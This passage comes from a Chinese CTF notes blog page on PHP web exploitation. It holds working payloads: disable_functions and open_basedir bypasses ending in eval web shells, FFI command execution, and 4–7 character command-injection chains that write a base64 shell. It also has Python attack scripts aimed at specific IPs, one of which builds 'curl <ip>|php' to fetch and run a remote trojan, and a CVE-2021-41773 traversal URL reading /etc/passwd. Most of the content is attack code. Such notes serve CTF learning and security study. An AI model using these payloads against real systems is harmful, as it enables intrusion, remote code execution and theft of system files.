该函数已不再被使用</span></span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> fpassthru(<span class="variable">$a</span>);                                     </span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">echo</span> fread(<span class="variable">$a</span>,<span class="string">&quot;1000&quot;</span>);                                   </span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgets(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;       </span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgetc(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;       </span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!feof(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = fgetcsv(<span class="variable">$a</span>);print_r(<span class="variable">$line</span>);&#125; </span><br></pre></td></tr></table></figure></li><li><p>include() / require()</p><p>适用非php文件</p></li><li><p>SPL文件类：<code>SplFileObject</code></p><p>按行读取，多行需要遍历</p></li><li><p>Mysql</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT LOAD_FILE(&#x27;/flag.txt&#x27;) as my&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&quot;my&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 结果&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​</p></li></ul><h3 id="读类信息"><a href="#读类信息" class="headerlink" title="读类信息"></a>读类信息</h3><ul><li>ReflectionClass::export()</li></ul><p>​</p><h3 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h3><ul><li><p><strong>LD_PRELOAD</strong></p><ul><li><p>函数替代：mail() -&gt; mb_send_mail()</p></li><li><p>参考</p><p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FLD_PRELOAD%E6%9D%A5%E7%BB%95%E8%BF%87php%20disable_function%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4.html">利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令</a></p></li></ul></li><li><p><strong>UAF</strong></p><p><strong><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php">php7-gc-bypass</a></strong>，<strong><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">php7-backtrace-bypass</a></strong>，<strong><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php">php-json-bypass</a></strong></p><p>法1：修改<code>pwn()</code>传入的<code>cmd</code>，上传php至可写目录，include包含执行。</p><p>法2：无需上传，将代码放入<code>eval</code>函数执行。</p><ul><li><p>参考题</p><p>buuoj-GKCTF2020-CheckIn</p></li></ul></li><li><p><strong>FFI</strong></p><p>使用条件：PHP版本&gt;=7.4</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>); </span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="string">&quot;cd /;./readflag &gt; /var/www/html/good.txt&quot;</span>); </span><br><span class="line">readgzfile(<span class="string">&quot;good.txt&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//直接调用php源码中的函数，php_exec的type为3时对应的是passthru，直接将结果原始输出</span></span><br><span class="line"><span class="variable">$e</span>=FFI::cdef(<span class="string">&quot;int php_exec(int type, char *cmd);&quot;</span>);</span><br><span class="line"><span class="variable">$e</span>-&gt;php_exec(<span class="number">3</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用c里的popen，然后从管道中读取结果</span></span><br><span class="line"><span class="variable">$e</span>=FFI::cdef(<span class="string">&quot;void *popen(char*,char*);\\nvoid pclose(void*);\\nint fgetc(void*);&quot;</span>,<span class="string">&quot;libc.so.6&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="variable">$e</span>-&gt;popen(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$d</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$c</span>=<span class="variable">$e</span>-&gt;fgetc(<span class="variable">$o</span>))!=-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="variable">$d</span>.=str_pad(strval(dechex(<span class="variable">$c</span>)),<span class="number">2</span>,<span class="string">&quot;0&quot;</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$e</span>-&gt;pclose(<span class="variable">$o</span>);</span><br><span class="line"><span class="keyword">echo</span> hex2bin(<span class="variable">$d</span>);</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>参考</p><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197745">PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数</a></p></li></ul><p>​</p><h3 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass open_basedir"></a>bypass open_basedir</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=mkdir(<span class="string">&#x27;/tmp/test&#x27;</span>);chdir(<span class="string">&#x27;/tmp/test&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);var_dump(scandir(<span class="string">&#x27;/&#x27;</span>));@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]); <span class="keyword">echo</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>​</p><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><ul><li><p><strong>7字符</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#写入语句</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">#base64编码后</span></span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsxXSk7</span><br><span class="line"><span class="comment">#需要被执行的语句：</span></span><br><span class="line"><span class="keyword">echo</span> PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">hp</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">1.p\\</span></span><br><span class="line"><span class="bash">&gt;d\&gt;\\</span></span><br><span class="line"><span class="bash">&gt;\ -\\</span></span><br><span class="line"><span class="bash">&gt;e64\\</span></span><br><span class="line"><span class="bash">&gt;bas\\</span></span><br><span class="line"><span class="bash">&gt;7\|\\</span></span><br><span class="line"><span class="bash">&gt;XSk\\</span></span><br><span class="line"><span class="bash">&gt;Fsx\\</span></span><br><span class="line"><span class="bash">&gt;dFV\\</span></span><br><span class="line"><span class="bash">&gt;kX0\\</span></span><br><span class="line"><span class="bash">&gt;bCg\\</span></span><br><span class="line"><span class="bash">&gt;XZh\\</span></span><br><span class="line"><span class="bash">&gt;AgZ\\</span></span><br><span class="line"><span class="bash">&gt;waH\\</span></span><br><span class="line"><span class="bash">&gt;PD9\\</span></span><br><span class="line"><span class="bash">&gt;o\ \\</span></span><br><span class="line"><span class="bash">&gt;ech\\</span></span><br><span class="line"><span class="bash">ls -t&gt;0</span></span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://192.168.61.157/rce.php?1=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">		requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#检查是否攻击成功</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://192.168.61.157/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p><strong>5字符</strong></p><ul><li><p>思路1</p><p>拼接字符串写入一句话，同7字符。</p></li><li><p>思路2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">dir</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">f\&gt;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">ht-</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sl</span></span><br><span class="line">*&gt;v</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">rev</span></span><br><span class="line">*v&gt;0</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">a</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">hp</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">p\\</span></span><br><span class="line"><span class="bash">&gt;1.\\</span></span><br><span class="line"><span class="bash">&gt;\&gt;\\</span></span><br><span class="line"><span class="bash">&gt;-d\\</span></span><br><span class="line"><span class="bash">&gt;\ \\</span></span><br><span class="line"><span class="bash">&gt;64\\</span></span><br><span class="line"><span class="bash">&gt;se\\</span></span><br><span class="line"><span class="bash">&gt;ba\\</span></span><br><span class="line"><span class="bash">&gt;\|\\</span></span><br><span class="line"><span class="bash">&gt;7\\</span></span><br><span class="line"><span class="bash">&gt;Sk\\</span></span><br><span class="line"><span class="bash">&gt;X\\</span></span><br><span class="line"><span class="bash">&gt;x\\</span></span><br><span class="line"><span class="bash">&gt;Fs\\</span></span><br><span class="line"><span class="bash">&gt;FV\\</span></span><br><span class="line"><span class="bash">&gt;d\\</span></span><br><span class="line"><span class="bash">&gt;X0\\</span></span><br><span class="line"><span class="bash">&gt;k\\</span></span><br><span class="line"><span class="bash">&gt;g\\</span></span><br><span class="line"><span class="bash">&gt;bC\\</span></span><br><span class="line"><span class="bash">&gt;h\\</span></span><br><span class="line"><span class="bash">&gt;XZ\\</span></span><br><span class="line"><span class="bash">&gt;gZ\\</span></span><br><span class="line"><span class="bash">&gt;A\\</span></span><br><span class="line"><span class="bash">&gt;aH\\</span></span><br><span class="line"><span class="bash">&gt;w\\</span></span><br><span class="line"><span class="bash">&gt;D9\\</span></span><br><span class="line"><span class="bash">&gt;P\\</span></span><br><span class="line"><span class="bash">&gt;S&#125;\\</span></span><br><span class="line"><span class="bash">&gt;IF\\</span></span><br><span class="line"><span class="bash">&gt;&#123;\\</span></span><br><span class="line"><span class="bash">&gt;\$\\</span></span><br><span class="line"><span class="bash">&gt;o\\</span></span><br><span class="line"><span class="bash">&gt;ch\\</span></span><br><span class="line"><span class="bash">&gt;e\\</span></span><br><span class="line"><span class="bash">sh 0</span></span><br><span class="line">sh f            </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.61.157/?cmd=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line"><span class="comment">#检查是否攻击成功</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://192.168.61.157/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>4字符</strong></p><ul><li><p>思路1</p><p>传入<code>&gt;cat</code>，在目标目录下写入cat文件；</p><p>再使用通配符进行执行<code>&gt;* /*</code>，读取根目录下的flag文件。</p></li><li><p>思路2</p><p>字符拼接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">dir</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">f\&gt;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">ht-</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sl</span></span><br><span class="line">*&gt;v        (等同于命令：dir &quot;f&gt;&quot; &quot;ht-&quot; &quot;sl&quot; &gt; v)</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">rev</span></span><br><span class="line">*v&gt;0        (等同于命令：rev v &gt; 0)(0里面的内容位:ls -th &gt;f)</span><br><span class="line">sh 0        (sh执行0里面的内容)</span><br></pre></td></tr></table></figure></li><li><p>思路3</p><p>反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">target = <span class="string">&#x27;http://52.197.41.31/&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 存放待下载文件的公网主机的IP</span></span><br><span class="line">shell_ip = <span class="string">&#x27;xx.xx.xx.xx&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 本机IP</span></span><br><span class="line">your_ip = r.get(<span class="string">&#x27;http://ipv4.icanhazip.com/&#x27;</span>).text.strip()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 将shell_IP转换成十六进制</span></span><br><span class="line">ip = <span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(i))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</span><br><span class="line">                     <span class="keyword">for</span> i <span class="keyword">in</span> shell_ip.split(<span class="string">&#x27;.&#x27;</span>)])</span><br><span class="line"> </span><br><span class="line">reset = target + <span class="string">&#x27;?reset&#x27;</span></span><br><span class="line">cmd = target + <span class="string">&#x27;?cmd=&#x27;</span></span><br><span class="line">sandbox = target + <span class="string">&#x27;sandbox/&#x27;</span> + </span><br><span class="line">    hashlib.md5(<span class="string">&#x27;orange&#x27;</span> + your_ip).hexdigest() + <span class="string">&#x27;/&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># payload某些位置的可选字符</span></span><br><span class="line">pos0 = random.choice(<span class="string">&#x27;efgh&#x27;</span>)</span><br><span class="line">pos1 = random.choice(<span class="string">&#x27;hkpq&#x27;</span>)</span><br><span class="line">pos2 = <span class="string">&#x27;g&#x27;</span>  <span class="comment"># 随意选择字符</span></span><br><span class="line"> </span><br><span class="line">payload = [</span><br><span class="line">    <span class="string">&#x27;&gt;dir&#x27;</span>,</span><br><span class="line">    <span class="comment"># 创建名为 dir 的文件</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;&gt;%s&gt;&#x27;</span> % pos0,</span><br><span class="line">    <span class="comment"># 假设pos0选择 f , 创建名为 f&gt; 的文件</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;&gt;%st-&#x27;</span> % pos1,</span><br><span class="line">    <span class="comment"># 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，</span></span><br><span class="line">    <span class="comment"># 因为alphabetical序中t&gt;s</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;&gt;sl&#x27;</span>,</span><br><span class="line">    <span class="comment"># 创建名为 &gt;sl 的文件；到此处有四个文件，</span></span><br><span class="line">    <span class="comment"># ls 的结果会是：dir f&gt; kt- sl</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line">    <span class="comment"># 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，</span></span><br><span class="line">    <span class="comment">#  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl</span></span><br><span class="line">    <span class="comment"># 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line">    <span class="comment"># 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">&#x27;*v&gt;%s&#x27;</span> % pos2,</span><br><span class="line">    <span class="comment"># 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。</span></span><br><span class="line">    <span class="comment"># 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 续行分割 curl 0x11223344|php 并逆序写入</span></span><br><span class="line">    <span class="string">&#x27;&gt;p&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;ph\&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;|\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;%s\<span class="string">&#x27; % ip[8:10],</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;%s\<span class="string">&#x27; % ip[6:8],</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;%s\<span class="string">&#x27; % ip[4:6],</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;%s\<span class="string">&#x27; % ip[2:4],</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;%s\<span class="string">&#x27; % ip[0:2],</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt; \<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;rl\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    &#x27;</span>&gt;cu\<span class="string">&#x27;,</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    &#x27;</span>sh <span class="string">&#x27; + pos2,</span></span><br><span class="line"><span class="string">    # sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来，</span></span><br><span class="line"><span class="string">    # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行</span></span><br><span class="line"><span class="string">    &#x27;</span>sh <span class="string">&#x27; + pos0,</span></span><br><span class="line"><span class="string">    # sh f 执行curl命令，下载文件，写入木马。</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">s = r.get(reset)</span></span><br><span class="line"><span class="string">for i in payload:</span></span><br><span class="line"><span class="string">    assert len(i) &lt;= 4</span></span><br><span class="line"><span class="string">    s = r.get(cmd + i)</span></span><br><span class="line"><span class="string">    print &#x27;</span>[%d]<span class="string">&#x27; % s.status_code, s.url</span></span><br><span class="line"><span class="string">    sleep(0.1)</span></span><br><span class="line"><span class="string">s = r.get(sandbox + &#x27;</span>fun.php?cmd=uname -a<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">print &#x27;</span>[%d]<span class="string">&#x27; % s.status_code, s.url</span></span><br><span class="line"><span class="string">print s.text</span></span><br></pre></td></tr></table></figure><p>​</p></li></ul></li></ul><h3 id="中间件漏洞"><a href="#中间件漏洞" class="headerlink" title="中间件漏洞"></a>中间件漏洞</h3><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><ol><li><p>Apache 2.4.49</p><p>CVE-2021-41773</p><p>目录穿越漏洞。可以读取到Apache服务器Web目录以外的其他文件，或者读取Web中的脚本源码，或者在开启cgi或cgid的服务器上执行任意命令。</p><p><code>http://xxx/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></p></li></ol></div><div class="article-footer"></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2020/05/24/misc-%E9%9B%B6%E5%AE%BD%E5%BA%A6%E5%AD%97%E7%AC%A6%E9%9A%90%E5%86%99/" title="零宽度字符隐写"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/2020/05/18/crypto-%E4%BB%BF%E5%B0%84%E5%AF%86%E7%A0%81/" title="仿射密码"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i 